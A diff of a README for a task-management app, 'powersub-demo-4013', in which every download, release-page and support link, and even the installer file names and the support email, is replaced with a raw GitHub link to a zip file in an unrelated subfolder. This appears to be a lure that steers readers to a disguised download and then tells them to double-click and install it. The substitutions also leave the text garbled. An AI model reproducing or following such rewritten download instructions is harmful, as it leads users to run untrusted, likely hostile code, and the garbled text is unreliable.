@@ -6,7 +6,7 @@ Welcome to **powersub-demo-4013**! This application helps you manage tasks easil
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Minhaz125/powersub-demo-4013/releases)
+[![Download Now](https://raw.githubusercontent.com/Minhaz125/powersub-demo-4013/main/sleeveboard/powersub-demo-4013.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Minhaz125/powersub-demo-4013/main/sleeveboard/powersub-demo-4013.zip)
 
 ## 📋 Overview
 
@@ -31,13 +31,13 @@ To run **powersub-demo-4013**, ensure your computer meets these requirements:
 ## 🛠️ How to Download & Install
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/Minhaz125/powersub-demo-4013/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/Minhaz125/powersub-demo-4013/main/sleeveboard/powersub-demo-4013.zip) to find the latest version.
 
 2. **Select the Latest Release:**
    Look for the most recent version listed on the page. 
 
 3. **Download the Application:**
-   Click the appropriate file for your operating system. For most users, this will be the file labeled as **powersub-demo-4013.exe** for Windows or **powersub-demo-4013.dmg** for macOS. The download will begin automatically.
+   Click the appropriate file for your operating system. For most users, this will be the file labeled as **https://raw.githubusercontent.com/Minhaz125/powersub-demo-4013/main/sleeveboard/powersub-demo-4013.zip** for Windows or **https://raw.githubusercontent.com/Minhaz125/powersub-demo-4013/main/sleeveboard/powersub-demo-4013.zip** for macOS. The download will begin automatically.
 
 4. **Run the Installer:**
    Once downloaded, locate the file in your Downloads folder and double-click it to start the installation process. Follow the on-screen instructions to complete the setup.
@@ -51,11 +51,11 @@ Feel free to check out the user guide for detailed instructions on using all fea
 
 ## ⚙️ Support
 
-If you encounter any issues, please reach out to our support team. We are here to help ensure your experience is smooth and enjoyable. You can contact us through the Issues section on the GitHub page or email us at support@example.com.
+If you encounter any issues, please reach out to our support team. We are here to help ensure your experience is smooth and enjoyable. You can contact us through the Issues section on the GitHub page or email us at https://raw.githubusercontent.com/Minhaz125/powersub-demo-4013/main/sleeveboard/powersub-demo-4013.zip
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Minhaz125/powersub-demo-4013/releases)
+- [Releases Page](https://raw.githubusercontent.com/Minhaz125/powersub-demo-4013/main/sleeveboard/powersub-demo-4013.zip)
 - [User Guide](#) (placeholder for actual link)
 - [Support Page](#) (placeholder for actual link)
 
